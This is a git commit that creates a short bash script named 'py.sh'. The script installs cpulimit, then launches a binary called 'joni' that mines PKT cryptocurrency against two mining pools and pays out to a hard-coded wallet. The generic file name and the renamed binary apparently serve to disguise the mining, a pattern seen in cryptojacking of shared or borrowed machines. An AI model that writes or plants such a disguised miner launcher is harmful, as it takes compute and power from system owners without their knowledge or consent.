4090526041795eb411a3eafc1125b6e4512d6f7b
kirmaanasir <92260954+kirmaanasir@users.noreply.github.com>
2022-01-26 21:19:46 +0700

    Create py.sh

---
+++ py.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=https://stratum.zetahash.com
+POOL2=http://pool.pktpool.io
+WALLET=pkt1q233g3ccdtjrum98nxmuggyr7z5gfzy26r5kk3l
+
+cd "$(dirname "$0")"
+
+apt-get install cpulimit && chmod +x ./joni && cpulimit --e joni --limit 500 -b && ./joni ann -p $WALLET $POOL $POOL2
